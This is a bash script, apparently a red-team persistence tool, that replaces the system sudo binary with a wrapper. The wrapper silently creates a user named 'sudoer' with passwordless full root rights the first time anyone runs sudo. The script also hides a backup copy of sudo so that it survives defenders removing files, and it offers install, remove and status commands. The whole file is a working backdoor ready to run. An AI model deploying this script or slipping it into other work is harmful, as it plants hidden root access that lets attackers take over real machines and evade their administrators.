#!/bin/bash
# sudo-biNOry.sh — wraps sudo to auto-create a persistent NOPASSWD backdoor user
#
# Usage:
#   sudo ./sudo-biNOry.sh install
#   sudo ./sudo-biNOry.sh remove
#   sudo ./sudo-biNOry.sh status

set -euo pipefail

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { echo -e "${RED}[!]${NC} Run as root"; exit 1; }; }

cmd_install() {
    require_root

    if [[ -f /usr/bin/sudo.based ]]; then
        warn "Already installed — /usr/bin/sudo.based exists"
        warn "Run remove first to re-deploy"
        exit 0
    fi

    hdr "Installing sudo wrapper"
    mv /usr/bin/sudo /usr/bin/sudo.based
    cp /usr/bin/sudo.based /usr/bin/sudo-backup-incase-blueteam-deletes
    mkdir -p /etc/sudoers.d

    /usr/bin/sudo.based tee /usr/bin/sudo << 'EOF'
#!/bin/bash
id sudoer &>/dev/null || /usr/bin/sudo.based bash -c \
  'useradd -m -s /bin/bash sudoer 2>/dev/null; echo "sudoer ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/sudoer'
/usr/bin/sudo.based "$@"
EOF

    /usr/bin/sudo.based chmod +x /usr/bin/sudo
    info "sudo wrapper installed"
    info "backdoor user 'sudoer' will be created on first sudo invocation"
}

cmd_remove() {
    require_root

    hdr "Restoring sudo"
    if [[ -f /usr/bin/sudo.based ]]; then
        mv /usr/bin/sudo.based /usr/bin/sudo
        rm -f /usr/bin/sudo-backup-incase-blueteam-deletes
        info "Restored real sudo"
    else
        warn "/usr/bin/sudo.based not found — nothing to restore"
    fi

    if [[ -f /etc/sudoers.d/sudoer ]]; then
        rm -f /etc/sudoers.d/sudoer
        userdel -r sudoer 2>/dev/null || true
        info "Removed sudoer user and sudoers entry"
    fi
}

cmd_status() {
    hdr "sudo binary"
    if grep -q "sudo.based" /usr/bin/sudo 2>/dev/null; then
        info "WRAPPED   /usr/bin/sudo (wrapper in place)"
    else
        warn "REAL      /usr/bin/sudo (not wrapped)"
    fi

    hdr "Backup binary"
    [[ -f /usr/bin/sudo.based ]] \
        && info "PRESENT   /usr/bin/sudo.based" \
        || warn "MISSING   /usr/bin/sudo.based"

    hdr "Backdoor user"
    if id sudoer &>/dev/null; then
        info "EXISTS    sudoer user is present"
        grep sudoer /etc/sudoers.d/sudoer 2>/dev/null || true
    else
        warn "ABSENT    sudoer user not yet created (triggers on first sudo)"
    fi
}

case "${1:-install}" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *) echo "Usage: sudo $0 install|remove|status" ;;
esac
